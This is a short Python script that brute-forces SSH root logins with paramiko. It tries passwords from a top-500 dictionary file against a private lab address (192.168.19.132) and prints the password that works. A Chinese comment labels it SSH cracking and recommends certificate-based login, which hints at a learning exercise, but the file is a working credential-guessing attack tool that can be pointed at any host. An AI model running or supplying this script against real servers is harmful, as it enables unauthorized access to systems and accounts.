import paramiko
import time
# 爆破SSH，建议使用证书进行登录
def ssh_crack():
    with open('../dict/password-top500.txt') as file:
        pw_list = file.readlines()

    for password in pw_list:
        try:
            transport = paramiko.Transport(('192.168.19.132', 22))
            transport.connect(username='root', password=password.strip())
            print(f"SSH破解成功，密码为：{password.strip()}")
            break
        except:
            pass

        time.sleep(1)

    # ssh = paramiko.SSHClient()
    # ssh._transport = transport
if __name__ == '__main__':
    ssh_crack()